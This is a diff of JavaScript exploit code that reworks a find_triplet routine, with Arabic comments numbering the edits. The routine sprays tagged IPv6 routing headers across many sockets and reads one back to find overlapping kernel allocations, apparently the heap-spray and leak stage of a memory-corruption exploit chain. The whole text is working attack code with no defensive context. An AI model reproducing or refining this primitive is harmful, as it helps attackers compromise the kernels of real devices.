@@ -833,48 +833,36 @@ function find_twins() {
   return false;
 }
 function find_triplet(master, other, iterations) {
-  if (typeof iterations === 'undefined') {
-    iterations = MAX_ROUNDS_TRIPLET;
-  }
-
-  var count    = 0;
+  if (typeof iterations === 'undefined') iterations = MAX_ROUNDS_TRIPLET;
+  var count = 0;
+  var val, i, j;
   var spray_add = spray_rthdr.add(0x04);
-  var leak_add  = leak_rthdr.add(0x04);
-
+  var leak_add = leak_rthdr.add(0x04);
   while (count < iterations) {
-    // 1) spray على كل socket ما عدا master و other
-    for (var i = 0; i < ipv6_socks.length; i++) {
+    for (i = 0; i < ipv6_socks.length; i++) {
       if (i === master || i === other) continue;
-      if (ipv6_socks[i].eq(BigInt_Error)) continue;
+      if (ipv6_socks[i].eq(BigInt_Error)) continue; // تعديل رقم 6
 
       write32(spray_add, RTHDR_TAG | i);
-      read32(spray_add); // memory barrier
+      read32(spray_add); // تعديل رقم 2
+
       set_rthdr(ipv6_socks[i], spray_rthdr, spray_rthdr_len);
     }
-
-    // 2) leak من master
-    write32(leak_add, 0);
+    write32(leak_add, 0); // تعديل رقم 4
     get_rthdr(ipv6_socks[master], leak_rthdr, 8);
+    val = read32(leak_add);
+    j = val & 0xFFFF;
 
-    var val = read32(leak_add);
-    var j   = val & 0xFFFF;
-
-    // منع false positives: لو رجع master أو other اعتبرها ضوضاء
+    // تعديل رقم 3 (منع false positives)
     if (j === master || j === other) {
       count++;
       continue;
     }
-
-    // 3) تحقق من الـ tag والـ index
-    if ((val & 0xFFFF0000) === (RTHDR_TAG & 0xFFFF0000) &&
-        j >= 0 &&
-        j < ipv6_socks.length) {
+    if ((val & 0xFFFF0000) === RTHDR_TAG && j >= 0 && j < ipv6_socks.length) {
       return j;
     }
-
     count++;
   }
-
   return -1;
 }
 function init_threading() {
